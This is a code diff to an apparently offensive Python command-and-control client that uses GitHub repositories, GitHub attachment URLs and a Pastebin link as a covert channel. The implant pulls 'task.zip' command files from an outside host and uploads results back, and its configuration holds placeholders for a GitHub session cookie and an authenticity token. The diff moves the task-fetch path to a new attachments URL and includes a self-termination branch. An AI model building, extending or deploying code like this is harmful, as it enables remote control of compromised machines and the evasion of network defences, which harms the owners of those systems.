@@ -13,12 +13,14 @@ PASTE_BIN = 'https://pastebin.com/raw/gQBy3rEY'
 
 C2_GITHUB_REPO = "https://github.com/gokupwn/c2_github_repo"
 C2_RESULT_REPO = "https://github.com/gokupwn/c2_result_repo"
-C2_GITHUB_ACCOUNT_COOKIE = 'YOUR_GITHUB_COOKIE'
+C2_GET_NEW_RESULT = "https://github.com/user-attachments/"
+
+C2_GITHUB_ACCOUNT_COOKIE =  'YOUR_GITHUB_COOKIE'
 C2_CLIENT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
 PROXY_HOST = ''
 PROXY_PORT = 8080
-AUTHENTICITY_TOKEN = 'YOUR_AUTHENTICITY_TOKEN'
-FIRST_TASK_ID = 15119236 ### TAKE IT FROM THE server.ini File and the value of first_command
+AUTHENTICITY_TOKEN =  'YOUR_AUTHENTICITY_TOKEN'
+FIRST_TASK_ID = 16767285 ### TAKE IT FROM THE server.ini File and the value of first_command
 
 def fetchRepoHtml(host, path):
     if PROXY_HOST == '':
@@ -316,7 +318,7 @@ def usePasteBin():
     tasks_ids = getTasksIds()
 
     for task_id in tasks_ids:
-        url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/task.zip"}
+        url = {"href": C2_GET_NEW_RESULT + f"/files/{task_id}/task.zip"}
         status_code, command = getCommandFromGithubC2(url)
         
         # Kill Yourself
@@ -352,7 +354,7 @@ def useGithub():
         expected_task_id = uploadResultToC2('starting', repo_id_c2server)
 
         while task_id < expected_task_id:
-            url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/task.zip"}
+            url = {"href": C2_GET_NEW_RESULT + f"/files/{task_id}/task.zip"}
             status_code, command = getCommandFromGithubC2(url)
 
             # Not my task_id
